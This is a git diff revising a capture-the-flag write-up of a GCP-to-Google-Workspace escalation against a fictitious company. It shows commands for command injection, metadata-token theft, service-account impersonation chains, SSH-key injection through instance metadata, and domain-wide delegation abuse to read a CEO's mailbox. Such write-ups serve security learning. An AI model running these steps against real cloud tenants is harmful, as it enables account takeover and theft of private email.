@@ -1,20 +1,24 @@
 # Learn The Alphabet
 
-The main goal of the track was to find a GCP to Google Workspace privliege pivot / escelation to compromise the CEO's email.
+The main goal of the track was to find a GCP to Google Workspace privilege pivot/escalation to compromise the CEO's email.
+
+![CompanyLogo.PNG](CompanyLogo.PNG)
 
 ## Flag 05
 
-We're provided with `CompanyLogo.PNG` that makes reference to a ficiticious company called MySuperAISaaS. Through Google, I found a GitHub repository https://github.com/mysuperaisaas/superaisaas which contained the flag in `README.md`:
+We start with `CompanyLogo.PNG`, which refers to a fictitious company called MySuperAISaaS. Through Google, I found a GitHub repository https://github.com/mysuperaisaas/superaisaas which contained the flag in `README.md`:
 
 ```
 Flag 5 - HF-67e4a7d0d044f147facc9d94c4002998
 ```
 
-Note: Although it says "Flag 5" this flag was actually valid as the 1st and (something?) flag. It might have been the first and 5th flag, but I forget.
+Note: Although it says "Flag 5," this flag was actually valid as the 1st and something-else flag.
 
 More OpSec on Google later uncovered https://www.linkedin.com/company/my-super-ai-saas/ with a comment on one of the posts containing a LinkedIn comment with the same flag:
 
 ![LinkedIn Comment](linkedin_comment.png)
+
+🚩
 
 ## Flag 06
 
@@ -31,7 +35,7 @@ Date:   Sun Oct 12 22:18:49 2025 -0400
     Working on deleting unsecure commits
 ```
 
-This commit contained a file called `encrypted_sa.txt` which contained a JSON object with AES256 encrypted data and a line deleted from the README that said:
+This commit contained a file called `encrypted_sa.txt` which included a JSON object with AES256 encrypted data, and a deleted line from the README that said:
 
 ````diff
 diff --git a/README.md b/README.md
@@ -48,7 +52,7 @@ index 3f81449..8d83b84 100644
  ### 📋 Prerequisites
 ````
 
-There's a Python file in the repo called `decryptJSON.py` that then returns unencrypted Google Cloud Platform (GCP) service account JSON credentials for the user `initial-sa@aisaas-project-474522.iam.gserviceaccount.com`.
+There's a Python file in the repo called `decryptJSON.py` that returns unencrypted Google Cloud Platform (GCP) service account JSON credentials for the user `initial-sa@aisaas-project-474522.iam.gserviceaccount.com`.
 
 Using those credentials, I discovered that we have access to `gcloud run` commands:
 
@@ -58,11 +62,9 @@ Using those credentials, I discovered that we have access to `gcloud run` comman
 ✔  cloudfunction1-hf2025  northamerica-northeast1  https://cloudfunction1-hf2025-753482425537.northamerica-northeast1.run.app  tyrell.wellick@mysuperaisaas.com  2025-10-13T14:23:46.223112Z
 ```
 
-One interesting note is that the code running in GCP doesn't match the code that's in the repository.
+One interesting note is that the code running in GCP doesn't appear to match the code in the repository.
 
 From there, listing service revisions shows:
-
-(I forget the specific command I ran to do this)
 
 ```console
    REVISION                         ACTIVE  SERVICE                DEPLOYED                 DEPLOYED BY
@@ -106,9 +108,11 @@ Execution Environment: First Generation
 ✔ Deploying revision succeeded in 4.45s.
 ```
 
+🚩
+
 ## Flag 07
 
-I discovered the [`gcloud run services proxy`](https://cloud.google.com/sdk/gcloud/reference/run/services/proxy) command which let me proxy the running function to `localhost`:
+I discovered the [`gcloud run services proxy`](https://cloud.google.com/sdk/gcloud/reference/run/services/proxy) command, which let me proxy the running function to `localhost`:
 
 ```console
 [MacBook-Pro ~]$ gcloud run services proxy cloudfunction1-hf2025 --port 8080
@@ -116,12 +120,14 @@ Proxying to Cloud Run service [cloudfunction1-hf2025] in project [aisaas-project
 http://127.0.0.1:8080/ proxies to https://cloudfunction1-hf2025-6htansbyrq-nn.a.run.app/
 ```
 
-From there,
+From there:
 
 ```console
 $ curl http://127.0.0.1:8080/
 {"status": "success", "message": "Welcome to MySuperAISaaS Cloud Function", "flag": "Flag-7 : HF-280b69759b56048c6f0799a4ceb2676a", "hint": "Try the 'local' endpoint with a 'com' parameter for tests and diagnostics"}
 ```
+
+🚩
 
 ## Flag 08
 
@@ -141,11 +147,9 @@ Connection: close
 {"status": "success", "output": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/www-data-home:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n"}
 ```
 
-I had ChatGPT built a small shell to make it easier to exploit this endpoint. That's saved as `shell.py`.
+I had ChatGPT build a small shell to make it easier to exploit this endpoint (included in the repository as `shell.py`).
 
-From there, we find lots of files in `/tmp`.
-
-For example:
+From there, we find lots of files in `/tmp`. For example, this shell script:
 
 ```bash
 #!/bin/bash
@@ -157,23 +161,21 @@ echo \"Testing Gmail API from function context:\"
 curl -s -H \"Authorization: Bearer $TOKEN\" \"https://gmail.googleapis.com/gmail/v1/users/tyrell.wellick@mysuperaisaas.com/messages?maxResults=1\"
 ```
 
-From here, I have two realizations. 1) this is a shared challenge VM, there's a web app that you're dropped into as the working directory, so we should leave a fake `flag.jpeg` to distract the other teams. 2) we can probably assume the GCP equivalent of an AWS instance profile to eseclate our privlieges.
+From here, I have two realizations. 1) This is a shared challenge VM. The files in `/tmp` are probably from other teams. There's a web app that you're dropped into as the working directory, so we should leave a fake `flag.jpeg` to distract the other teams. 2) We can assume the GCP equivalent of an AWS instance profile to escalate our privileges.
 
+I generated a GCP access token using Google's metadata endpoint: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`.
 
-I generated a GCP access token using Google's metadata endpoint:
+Then, I used [Thunder CTF's](https://github.com/NicholasSpringer/thunder-ctf) `test-permissions.py` to enumerate permissions for the `function-sa@aisaas-project-474522.iam.gserviceaccount.com` user:
 
-http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
-
- Then, I used [Thunder CTF's](https://github.com/NicholasSpringer/thunder-ctf) `test-permissions.py` to enumerate permissions for the `function-sa@aisaas-project-474522.iam.gserviceaccount.com` user:
-
-```
+```console
+$ python test-permissions.py "ya29[redacted]iOtF"
 Access token: ya29...iOtF
 ['iam.roles.get', 'iam.roles.list', 'iam.serviceAccounts.get', 'iam.serviceAccounts.getIamPolicy', 'iam.serviceAccounts.list', 'resourcemanager.projects.get', 'resourcemanager.projects.getIamPolicy']
 ```
 
 From there, we get a complete list of all the service accounts:
 
-```
+```console
 [MacBook-Pro scripts] (master)$ gcloud iam service-accounts list
 DISPLAY NAME                        EMAIL                                                            DISABLED
 App Engine default service account  aisaas-project-474522@appspot.gserviceaccount.com                False
@@ -188,14 +190,16 @@ sa-implicit-b                       sa-implicit-b@aisaas-project-474522.iam.gser
 Default compute service account     753482425537-compute@developer.gserviceaccount.com               False
 ```
 
-We might have had access to this list before, but before Thunder CTF I didn't know that this was a feature of GCP.
+We might have had access to this list before, but before using Thunder CTF, I didn't know that this was a feature of GCP.
 
-
-We discovered the IAM policy for the project:
+Next, I discovered the IAM policy for the project:
 
 ```console
 [MacBook-Pro scripts] (master)$ gcloud projects get-iam-policy aisaas-project-474522
 ```
+
+<details>
+<summary>project IAM policy</summary>
 
 ```yaml
 bindings:
@@ -271,7 +275,9 @@ etag: BwZBJM9XqlA=
 version: 1
 ```
 
-Which showed that `function-sa@aisaas-project-474522.iam.gserviceaccount.com` had access to the `roles/artifactregistry.reader` IAM role. From there, flag 8 is in the container image:
+</details>
+
+The project IAM policy shows that `function-sa@aisaas-project-474522.iam.gserviceaccount.com` has access to the `roles/artifactregistry.reader` IAM role.
 
 ```yaml
 - members:
@@ -279,11 +285,11 @@ Which showed that `function-sa@aisaas-project-474522.iam.gserviceaccount.com` ha
   role: projects/aisaas-project-474522/roles/artifactRegistryRO
 ```
 
-Found `northamerica-northeast1-docker.pkg.dev/aisaas-project-474522/dockervmhackfest25/mysuperaisaas` image in the registry
-
-Pulled it
+In the GCP container registry, I found the `northamerica-northeast1-docker.pkg.dev/aisaas-project-474522/dockervmhackfest25/mysuperaisaas` container image. From there, we find the 8th flag.
 
 ```console
+$ gcloud auth configure-docker northamerica-northeast1-docker.pkg.dev
+$ docker pull northamerica-northeast1-docker.pkg.dev/aisaas-project-474522/dockervmhackfest25/mysuperaisaas
 $ docker run -it --entrypoint /bin/sh northamerica-northeast1-docker.pkg.dev/aisaas-project-474522/dockervmhackfest25/mysuperaisaas:latest
 WARNING: The requested image's platform (linux/amd64) does not match the detected host platform (linux/arm64/v8) and no specific platform was requested
 # cd /root
@@ -303,14 +309,13 @@ Flag-8
 HF-c13da63184a5eb5993e77fc9c92c5db0
 ```
 
+🚩
+
 ## Flag 09
 
-In the container image we just pulled, we found credentials for the `sa-secretmgr@aisaas-project-474522.iam.gserviceaccount.com` service account:
+In the container image we just pulled, there's a `.gcp` directory next to the previous flag, which contains credentials for the `sa-secretmgr@aisaas-project-474522.iam.gserviceaccount.com` service account:
 
 ```console
-# cat Flag-8.txt
-Flag-8
-HF-c13da63184a5eb5993e77fc9c92c5db0
 # ls -al .gcp
 total 12
 drwxr-xr-x 1 root root 4096 Oct 13 21:03 .
@@ -332,7 +337,15 @@ drwx------ 1 root root 4096 Oct 21 11:15 ..
 }
 ```
 
+Using more gcloud CLI IAM commands and the following snippet from the project IAM policy, we can see what permissions this account has:
+
+```yaml
+- members:
+  - serviceAccount:sa-secretmgr@aisaas-project-474522.iam.gserviceaccount.com
+  role: projects/aisaas-project-474522/roles/secretmgrcustom
 ```
+
+```console
 $ gcloud iam roles describe --project aisaas-project-474522 secretmgrcustom
 description: 'Created on: 2025-10-14'
 etag: BwZBH3nJlo0=
@@ -346,6 +359,9 @@ stage: ALPHA
 title: secretmgr-custom
 ```
 
+From there, I tried to list all secrets:
+
+```console
 [MacBook-Pro learn-the-alphabet]$ gcloud secrets list
 NAME                          CREATED              REPLICATION_POLICY  LOCATIONS
 Super_Secret_Service_Account  2025-10-14T14:28:01  automatic           -
@@ -374,11 +390,13 @@ HF-a7e0ee7b5a738703b4584e61068fbaff
 }%
 ```
 
+🚩
+
 ## Flag 10
 
-We saw a role attached to `sa-implicit-a` named `HINT_Check_resources_based_permissions_GCP_can_do_resource_based`.
+In the project IAM policy from either, we saw a role attached to the `sa-implicit-a` service account named `HINT_Check_resources_based_permissions_GCP_can_do_resource_based`.
 
-```
+```console
 [MacBook-Pro ~]$ gcloud iam roles describe --project aisaas-project-474522 HINT_Check_resources_based_permissions_GCP_can_do_resource_based
 description: 'Created on: 2025-10-14'
 etag: BwZBH-BukrE=
@@ -387,13 +405,9 @@ includedPermissions:
 name: projects/aisaas-project-474522/roles/HINT_Check_resources_based_permissions_GCP_can_do_resource_based
 ```
 
-I saw `sa-implicit-b`, `sa-implicit-c`, etc. and figured we needed to some how assume those roles.
+The role really wants us to look into implicit / resource-based IAM permissions. I saw `sa-implicit-b` and  `sa-implicit-c` so I figured we needed to somehow assume those roles.
 
-I asked ChatGPT if we could enumerate which roles I had permission to assume somehow.
-
-https://chatgpt.com/share/e/68f76cd6-dc9c-8007-8c0d-93372d2bfd4f
-
-based GPT helped me do
+I asked ChatGPT if we could somehow enumerate which roles I had permission to assume. BasedGPT helped me come up with:
 
 ```bash
 # List all SAs
@@ -408,8 +422,57 @@ for sa in $(gcloud iam service-accounts list --project aisaas-project-474522 --f
 done | sed 's/privateKey/privateKey/g'   # (just avoiding accidental terminal copying)
 ```
 
-which showed we had access to assume `sa-implicit-b`
+Which results in the following output:
 
+```console
+= aisaas-project-474522@appspot.gserviceaccount.com ==
+
+  null
+== sa-implicit-c@aisaas-project-474522.iam.gserviceaccount.com ==
+bindings:
+- members:
+  - serviceAccount:sa-implicit-b@aisaas-project-474522.iam.gserviceaccount.com
+  role: projects/aisaas-project-474522/roles/getaccesstokencustom
+== docker-sa@aisaas-project-474522.iam.gserviceaccount.com ==
+
+  null
+== vm-serviceaccount@aisaas-project-474522.iam.gserviceaccount.com ==
+bindings:
+- members:
+  - serviceAccount:sa-secretmgr@aisaas-project-474522.iam.gserviceaccount.com
+  role: projects/aisaas-project-474522/roles/getaccesstokencustom
+- members:
+  - serviceAccount:vm-serviceaccount@aisaas-project-474522.iam.gserviceaccount.com
+  role: projects/aisaas-project-474522/roles/sakeyCreator
+- members:
+  - serviceAccount:vm-serviceaccount@aisaas-project-474522.iam.gserviceaccount.com
+  role: roles/iam.serviceAccountAdmin
+- members:
+  - serviceAccount:sa-implicit-c@aisaas-project-474522.iam.gserviceaccount.com
+  role: roles/iam.serviceAccountUser
+== sa-implicit-a@aisaas-project-474522.iam.gserviceaccount.com ==
+
+  null
+== function-sa@aisaas-project-474522.iam.gserviceaccount.com ==
+
+  null
+== sa-secretmgr@aisaas-project-474522.iam.gserviceaccount.com ==
+
+  null
+== initial-sa@aisaas-project-474522.iam.gserviceaccount.com ==
+
+  null
+== sa-implicit-b@aisaas-project-474522.iam.gserviceaccount.com ==
+bindings:
+- members:
+  - serviceAccount:sa-implicit-a@aisaas-project-474522.iam.gserviceaccount.com
+  role: projects/aisaas-project-474522/roles/implicitdelegationcustom
+== 753482425537-compute@developer.gserviceaccount.com ==
+
+  null
+```
+
+Which shows that `sa-implicit-a` may be able to assume `sa-implicit-b` via something called "implicit delegation."
 
 ```console
 == sa-implicit-b@aisaas-project-474522.iam.gserviceaccount.com ==
@@ -418,6 +481,7 @@ bindings:
   - serviceAccount:sa-implicit-a@aisaas-project-474522.iam.gserviceaccount.com
   role: projects/aisaas-project-474522/roles/implicitdelegationcustom
 == 753482425537-compute@developer.gserviceaccount.com ==
+```
 
 ```console
 [MacBook-Pro learn-the-alphabet]$ gcloud iam roles describe --project aisaas-project-474522 implicitdelegationcustom
@@ -431,4 +495,232 @@ stage: ALPHA
 title: implicitdelegation-custom
 ```
 
-we didn't have explicit permissions to generate a token for B but can delegate B to generate a token for C
+We didn't have explicit permissions to generate a token for B. However, we pause here because we realize that `sa-secretmgr@aisaas-project-474522.iam.gserviceaccount.com` has access to the `getaccesstokencustom` role, which has the ability to impersonate the `vm-serviceaccount` service account:
+
+```console
+$ gcloud auth login sa-secretmgr@aisaas-project-474522.iam.gserviceaccount.com
+$ gcloud auth print-access-token --impersonate-service-account=vm-serviceaccount@aisaas-project-474522.iam.gserviceaccount.com
+WARNING: This command is using service account impersonation. All API calls will be executed as [vm-serviceaccount@aisaas-project-474522.iam.gserviceaccount.com].
+ya29[redacted]9ZQk
+```
+
+And from the project IAM policy, we know `vm-serviceaccount` can create private keys for other service accounts:
+
+```console
+[MacBook-Pro learn-the-alphabet]$ gcloud iam roles describe --project aisaas-project-474522 sakeyCreator
+description: 'Created on: 2025-10-16'
+etag: BwZBSkAzHqk=
+includedPermissions:
+- iam.serviceAccountKeys.create
+name: projects/aisaas-project-474522/roles/sakeyCreator
+stage: ALPHA
+title: keyCreator
+```
+
+To summarize, since a lot is going on:
+
+1) We have access to `sa-implicit-a` which should be able to assume `sa-implicit-b` through something called "implicit delegation," but we haven't gotten it to work yet.
+2) We have service account credentials for `sa-secretmgr` from a previous flag, but we only now realize from the ChatGPT output that it has an implicit ability to generate an access token for `vm-serviceaccount`.
+
+From here, we're unsure what to do with `vm-serviceaccount`. I think this is because we got a permissions error trying to create a service account key for the `sa-implicit-*` roles. So, we continue talking to ChatGPT to figure out how to assume `sa-implicit-b` because we're getting a 403 error when we attempt the `gcloud auth print-access-token --impersonate-service-account` command from earlier.
+
+ChatGPT said:
+
+> Ah—this makes sense. You hit the classic nuance:
+>	- `iam.serviceAccounts.getAccessToken` is the permission that actually lets you mint a token for a **target** SA.
+>	- `iam.serviceAccounts.implicitDelegation` **alone** does **not** let you mint a token for that SA. It only lets that SA appear in the **delegation chain** (`delegates` array) when _someone else_ in the chain has `getAccessToken` on the next hop.
+>
+> From what you found:
+>  - **A** → **B**: `sa-implicit-a` has `implicitDelegation` on `sa-implicit-b` (but not tokenCreator/getAccessToken on B) → you **cannot** call `...:generateAccessToken` **on B** directly. That’s why you got the 403.
+> - **B** → **C**: `sa-implicit-b` is granted **getaccesstokencustom** on **sa-implicit-c** (which almost certainly includes `iam.serviceAccounts.getAccessToken`) → B _can_ mint a token for C.
+> - Therefore, as **A**, you can mint a token for **C** by calling `generateAccessToken` on **C** with a **delegates chain** `[B, A]`.
+>
+> Use A’s creds and target **C**, not B: [...]
+
+🥴😵. However convoluted, we follow BasedGPT's advice, using an auth token for `sa-implicit-a`, and we get an auth token for `sa-implicit-c` 🥳:
+
+```console
+$ curl -X "POST" "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/sa-implicit-c@aisaas-project-474522.iam.gserviceaccount.com:generateAccessToken" \
+     -H 'Authorization: Bearer ya29[redacted]VvbS' \
+     -H 'Content-Type: application/json; charset=utf-8' \
+     -d $'{
+  "scope": [
+    "https://www.googleapis.com/auth/cloud-platform"
+  ],
+  "delegates": [
+    "sa-implicit-b@aisaas-project-474522.iam.gserviceaccount.com"
+  ]
+}'
+[...]
+```
+
+From the project IAM policy, we know that `sa-implicit-c` has access to a custom `projects/aisaas-project-474522/roles/setmedatacustom` role as well as `compute.osLogin`, `compute.serviceAgent`, and `compute.viewer`. We also discover that `setmedatacustom` has access to `compute.instances.setMetadata`:
+
+```console
+[MacBook-Pro learn-the-alphabet]$ gcloud iam roles describe --project aisaas-project-474522 setmedatacustom
+description: 'Created on: 2025-10-14'
+etag: BwZBJMyOcKI=
+includedPermissions:
+- compute.instances.setMetadata
+name: projects/aisaas-project-474522/roles/setmedatacustom
+stage: ALPHA
+title: setmetata-custom
+```
+
+Using the gcloud CLI, we see that a VM is running:
+
+```console
+[MacBook-Pro learn-the-alphabet]$ gcloud compute instances describe vmhackfest2025
+[lots of output, including information about SSH keys]
+```
+
+I added my own SSH key to the instance metadata for the `tyrell_wellick` user:
+
+```console
+$ gcloud compute instances add-metadata vmhackfest2025 --metadata=ssh-keys="tyrell_wellick:ssh-ed25519 <my public key>"
+```
+
+And then we found the flag:
+
+```console
+[MacBook-Pro learn-the-alphabet]$ ssh tyrell_wellick@34.186.202.244
+The authenticity of host '34.186.202.244 (34.186.202.244)' can't be established.
+ED25519 key fingerprint is SHA256:L0P7gnFJnrFoI31AszjonCumTLznBHETA+VyUsRAz/Y.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '34.186.202.244' (ED25519) to the list of known hosts.
+Linux vmhackfest2025 6.1.0-40-cloud-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Oct 17 14:48:51 2025 from 35.235.242.66
+tyrell_wellick@vmhackfest2025:~$ ls
+Flag-10.txt  hint.txt
+tyrell_wellick@vmhackfest2025:~$ cat Flag-10.txt 
+Flag-10
+
+HF-565cd85c355bd15f20d5e3ea6cf0a3e0
+```
+
+🚩
+
+## Flag 11
+
+We have a hint on the VM:
+
+```console
+tyrell_wellick@vmhackfest2025:~$ cat hint.txt 
+Time to move from GCP to Google Workspace ;)
+
+Find a way to make the bridge !
+```
+
+From the start of the track, we knew the goal was to compromise Tyrell Wellick, the CEO's email address. I think I was googling GCP to Google Workspace delegation vulnerabilities when I discovered a tool written by the challenge designer called [Delegate](https://github.com/lutzenfried/Delegate) to perform "GCP domain-wide delegation abuse."
+
+I used the `sakeyCreator` permission on the `vm-serviceaccount` to generate a service account credential that I could save on my machine and use with Delegate. From there, I just gave it a shot to see if Delegate would work right out of the box. I had to make some modifications since Delegate had a bug where it was sourcing functions from the wrong internal Python modules and not dumping complete HTML sources. My changes to Delegate are available here: https://github.com/rbreslow/Delegate/commits/rb/hackfest/.
+
+Flag 11 is found in the body of one of Tyrell's emails (full emails in `tyrell_emails.txt`):
+
+```console
+$ python delegate.py -k ~/hackfest/learn-the-alphabet/vm-serviceaccount.json -i tyrell.wellick@mysuperaisaas.com -m gmail -a read
+
+██████╗ ███████╗██╗     ███████╗ ██████╗  █████╗ ████████╗███████╗
+██╔══██╗██╔════╝██║     ██╔════╝██╔════╝ ██╔══██╗╚══██╔══╝██╔════╝
+██║  ██║█████╗  ██║     █████╗  ██║  ███╗███████║   ██║   █████╗  
+██║  ██║██╔══╝  ██║     ██╔══╝  ██║   ██║██╔══██║   ██║   ██╔══╝    
+██████╔╝███████╗███████╗███████╗╚██████╔╝██║  ██║   ██║   ███████╗  v3.1.0
+╚═════╝ ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝  by @lutzenfried
+
+[*] Authentication: Using Service Account Key
+[*] Impersonating: tyrell.wellick@mysuperaisaas.com
+[*] Module: gmail
+[*] Action: read
+[...]
+```
+
+```html
+<div>Thanks for joining our executive meeting on short notice, I think we have a path for great success with
+    MySuperAISaaS but please make sure to keep everything mentioned during the meeting confidential and sensitive.
+</div>
+<div><br></div>
+<div>Flag-11 </div>
+<div><br></div>
+<div>HF-354e6d797d4ad4000ff7bf70fceaba91</div>
+<div><br></div>
+<div>Have a  great evening,</div>
+<div><br></div>
+```
+
+🚩
+
+## Flag 12
+
+Contained within a Microsoft Word document in Tyrell's Google Drive:
+
+```console
+[MacBook-Pro Delegate] (main *%%)$ python delegate.py -k ~/hackfest/learn-the-alphabet/vm-serviceaccount.json -i tyrell.wellick@mysuperaisaas.com -m gmail -a listFolders  
+
+██████╗ ███████╗██╗     ███████╗ ██████╗  █████╗ ████████╗███████╗
+██╔══██╗██╔════╝██║     ██╔════╝██╔════╝ ██╔══██╗╚══██╔══╝██╔════╝
+██║  ██║█████╗  ██║     █████╗  ██║  ███╗███████║   ██║   █████╗  
+██║  ██║██╔══╝  ██║     ██╔══╝  ██║   ██║██╔══██║   ██║   ██╔══╝    
+██████╔╝███████╗███████╗███████╗╚██████╔╝██║  ██║   ██║   ███████╗  v3.1.0
+╚═════╝ ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝  by @lutzenfried
+
+[*] Authentication: Using Service Account Key
+[*] Impersonating: tyrell.wellick@mysuperaisaas.com
+[*] Module: gmail
+[*] Action: listFolders
+
+======================= Dossiers identifiés dans Google Drive =======================
+
+Meet Recordings (1EXXW8OcjkYEMHUC-JXsNushJfzouTG48) - 1 Fichier(s):
+  - Sensitive_Meeting_Record (Type MIME: video/mp4)
+
+Billing (1tlv6nmV4mSu_UxSSRLp_3ZQm-C6XdcoG) - 0 Fichier(s):
+
+Partners (1GVFPfH0MEybbjCu7xszOXRhernEgdVUh) - 0 Fichier(s):
+
+Management (1HU58HGFQMShSLJ9WqJQmnzrrxxUHQRk_) - 0 Fichier(s):
+
+Finance (1yZhAtlneAVwB8bwzTbwT5rQh9eT4GBf8) - 0 Fichier(s):
+
+IT-Tech (1tORWzNVWsKCYyUREZ7Glpw_9MUQLni59) - 1 Fichier(s):
+  - Financial Sensitive Documents - Flag-12 (Type MIME: application/vnd.google-apps.document)
+
+Strategic (1cCuAjiP_uoQFHmELbWRbx5A-Wfhibm9o) - 0 Fichier(s):
+
+Company_Marketing (1kZPhKcQ2q_M1Kr0gakx2V01qCXzU1_fq) - 5 Fichier(s):
+  - logo_company.png (Type MIME: image/png)
+  - me_the_boss.webp (Type MIME: image/webp)
+  - my_dream_wife.png (Type MIME: image/png)
+  - Promotional_Tyrell.webp (Type MIME: image/webp)
+  - tyrell_wellick.png (Type MIME: image/png)
+
+[*] Operation completed.
+```
+
+![Flag 12](flag_12.png)
+
+🚩
+
+## Flag 13
+
+Contained within a snippet of `Sensitive_Meeting_Record.mp4`:
+
+![Flag 13](flag_13.png)
+
+🚩
+
+## The Hunt for Flag 14
+
+We couldn't find the final flags. However, after talking to the 1st place team, it sounded like we had to access the chat history of one of the fake employees mentioned either in the GitHub commit history or on their fake LinkedIn. We were too tired to make this connection towards the end.
+
+## Final Thoughts
+
+- I still think the delegation chain from `sa-implicit-a` to `sa-implicit-c` is still murky.
+- We missed a few of the first flags. I still have no idea where those are 🤦‍♀️. These are basic OSINT things that we should be better at.
